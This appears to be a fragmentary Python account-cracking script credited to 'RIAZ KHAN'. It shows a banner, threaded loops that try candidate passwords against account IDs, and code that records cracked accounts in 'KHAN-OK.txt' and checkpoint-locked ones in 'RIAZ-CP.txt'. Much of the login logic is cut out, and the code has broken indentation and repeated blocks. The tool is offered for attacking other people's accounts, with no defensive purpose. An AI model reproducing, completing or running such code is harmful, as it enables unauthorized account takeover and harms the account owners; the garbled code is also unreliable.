 ...
 \ \ ,  /  \ \ \ \ \  __ \   //'/'    
  \ \ \\ \  \_\ \__\ \ \/\ \ //'/'___  
   \ \_\ \_\/\_____\ \_\ \_\/\_______\
    \/_/\/ /\/_____/\/_/\/_/\/_______/
      ┌──────────────────────┐
  WARNING:USE FAST INRERNET:                                
\033[37;1m[\033[41;1m RIAZ-KHAN - PROGARAMING \033[00;1m\033[37;1m ]\n
\033[1;37;40m┌──────────────────────┐
\033[1;37;40m│ ® Script By  RIAZ KHAN® |
\033[1;37;40m└──────────────────────┘
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [RIAZ-OK] Saved to : KHAN-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [RIAZ-CP] Saved to : RIAZ-CP.txt\n"))
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mRIAZ-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("RIAZ-CP.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mKHAN-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("KHAN-OK.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [KHAN-OK] Saved to : KHAN-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [RIAZ-CP] Saved to : RIAZ-CP.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					...
					print(("\r\x1b[0;33m[\x1b[0;37mRIAZ-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("RIAZ-CP.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
					...
					print(("\r\x1b[0;32m[\x1b[0;37mKHAN-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("KHAN-OK.txt").read():
						break
					else:
						open("KHAN-OK.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
...
def ress():
    ...
    print((k+"\n[ "+p+"OK"+k+" ]"+p))
    try:
        os.system("cat KHAN-OK.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat RIAZ-CP.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
